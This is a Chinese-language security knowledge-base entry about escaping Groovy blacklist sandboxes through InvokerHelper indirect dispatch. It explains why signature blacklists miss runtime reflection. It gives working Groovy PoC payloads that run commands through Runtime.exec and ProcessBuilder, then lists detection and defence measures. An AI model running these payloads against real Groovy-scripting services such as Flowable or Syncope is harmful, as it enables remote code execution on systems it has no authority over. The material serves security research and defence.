---
id: binary-pwn-sandbox-escape-groovy-invokerhelper-indirect-dispatch
title: Groovy 沙箱 InvokerHelper 间接调用逃逸：签名与目标分离
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: groovy-sandbox-indirect-dispatch
tags:
- groovy
- sandbox-escape
- invokerhelper
- reflection
- blacklist
- jvm
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V2
  verified_at: '2026-11-04T21:42:19+08:00'
  notes: 已对照原文与截图核对：InvokerHelper.invokeStaticMethod(Method 在运行期参数、Java 反射层派发)、#1418 后仍可绕过、Flowable 同样有效，均与原文一致；截图 img/04 显示 400 响应内 RCE:uid=100 回显。PoC 未独立执行。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-groovy-invokerhelper-indirect-dispatch/
draft: false
kb_aliases:
- InvokerHelper 沙箱绕过
- Groovy 间接调用逃逸
- 签名与目标分离
- groovy-sandbox 架构边界
---

## 一句话结论

即使黑名单已把 `Runtime.exec`、`ProcessBuilder`、`GroovyShell` 等直接签名全部列全，`org.codehaus.groovy.runtime.InvokerHelper.invokeStaticMethod(Runtime.class, "getRuntime", null)` 这类调用仍能执行命令：黑名单只检查第一跳的 `InvokerHelper.invokeStaticMethod` 签名，真实目标藏在运行期参数里，由 Java 反射层完成派发，完全绕过 AST 改写。

## 原理

- `SandboxTransformer` 只改写 Groovy 源码中“直接书写”的方法调用。改写后，拦截器拿到的是接收者类 + 方法名 + 参数类型组成的静态签名，例如 `staticMethod java.lang.Runtime getRuntime`。
- `InvokerHelper` 是 Groovy 运行时自身的方法调度核心，提供 `invokeStaticMethod(Class sender, String method, Object[] args)`、`invokeMethod(Object object, String method, Object args)`、`invokeConstructorOf(Class klass, Object[] args)`、`getProperty/setProperty` 等通用派发方法。
- 攻击者把危险目标作为运行期参数传入：`InvokerHelper.invokeStaticMethod(Runtime.class, 'getRuntime', null)`。AST 改写后检查的是 `InvokerHelper.invokeStaticMethod`，黑名单没有这条签名，于是放行。
- `InvokerHelper` 内部通过 `MetaClassImpl` 等机制使用 `java.lang.reflect.Method.invoke()` 完成真实调用。这个派发发生在 Java 层，不在 Groovy AST 改写范围内，因此不会再经过 `Checker`。
- 关键不是“漏了一条黑名单”，而是黑名单只覆盖 Groovy 语法派发层，而间接派发是 Groovy 运行时自身的工作方式。`InvokerHelper`、`MetaClassImpl`、`ScriptBytecodeAdapter`、`CallSite` 都属于这一类，全部拉黑会破坏 Groovy 正常运行，因此无法用黑名单彻底闭合。

## 触发条件

- 目标使用 groovy-sandbox / lib-groovy-sandbox 类黑名单沙箱，且黑名单已覆盖 `Runtime`、`ProcessBuilder`、`GroovyShell` 等直接危险签名。
- 沙箱没有（或无法安全地）拦截 `InvokerHelper`、`MetaClassImpl`、`ScriptBytecodeAdapter`、`CallSite` 等运行时派发入口。
- 攻击者能提交 Groovy 脚本并让其执行。
- 运行时 classpath 中存在 Groovy（`InvokerHelper` 属于 Groovy 运行时）。

## 利用步骤

1. 确认沙箱存在且直接调用被拦截：提交 `Runtime.getRuntime().exec("id")`，观察是否抛 `SecurityException`。
2. 改用间接派发：拿到 `InvokerHelper` 类，调用 `invokeStaticMethod` 获取 `Runtime` 实例。
3. 用 `invokeMethod` 调用 `exec`，传入命令字符串。
4. `waitFor()` 后用 `InputStream.transferTo(ByteArrayOutputStream)` 读取输出，拼进异常消息回显。
5. 在沙箱已“语法层无死角”的版本上验证：同一 payload 仍应执行成功。

## PoC

```groovy
def IH = org.codehaus.groovy.runtime.InvokerHelper
def r  = IH.invokeStaticMethod(java.lang.Runtime.class, 'getRuntime', null)
def p  = IH.invokeMethod(r, 'exec', 'id')
p.waitFor()
def baos = new java.io.ByteArrayOutputStream()
p.getInputStream().transferTo(baos)
throw new RuntimeException('RCE:' + new String(baos.toByteArray(), 'UTF-8').trim())
```

```groovy
// 构造器调用同样可被间接派发
def IH = org.codehaus.groovy.runtime.InvokerHelper
def pb = IH.invokeConstructorOf(java.lang.ProcessBuilder.class,
          [['sh', '-c', 'id'] as String[]] as Object[])
def p  = IH.invokeMethod(pb, 'start', null)
```

说明：payload 为原文验证过的结构；未在目标环境执行。回显依赖异常消息被应用返回。

## 变体与关联

- 变体：`invokeMethod`、`invokeConstructorOf`、`getProperty`、`setProperty` 都可作为间接派发入口；目标可以是任意类/方法/构造器。
- 变体：同类运行时派发路径还有 `MetaClassImpl`、`ScriptBytecodeAdapter`、`CallSite`；它们通常也不能被安全拉黑。
- 关联：[[binary-pwn-sandbox-escape-groovy-interpreter-reinstantiation]]（黑名单未覆盖解释器入口时的第一层绕过）；[[binary-pwn-sandbox-escape-groovy-reflection-blacklist-gaps]]（MethodHandles/beans 等反射盲区）。
- 关联：[[web-java-component-syncope-connector-script-rce]]（该 payload 在连接器脚本路径上的完整利用）。
- 同一 payload 在 Flowable BPMN 的 groovy scriptTask 等其他沙箱路径同样有效，说明这不是单个产品的遗漏。

## 检测与防御

- 检测：脚本中出现 `InvokerHelper`、`MetaClassImpl`、`ScriptBytecodeAdapter`、`CallSite`、`invokeStaticMethod`、`invokeMethod`、`invokeConstructorOf` 等组合。
- 检测：脚本先被直接调用拦截、随后改用反射/间接派发的行为；同一提交者短时间内多次变更 payload。
- 防御：认识到黑名单无法闭合这一层；对不可信脚本使用独立 JVM/进程/容器，限制子进程、文件系统与网络；关闭不必要的脚本功能。
- 防御：若必须使用 Groovy，优先采用白名单式 API 暴露或独立解释器，而不是“危险签名黑名单”。
- 防御：对脚本执行记录完整审计（提交人、脚本哈希、执行结果），并对异常回显中的命令输出做监控。
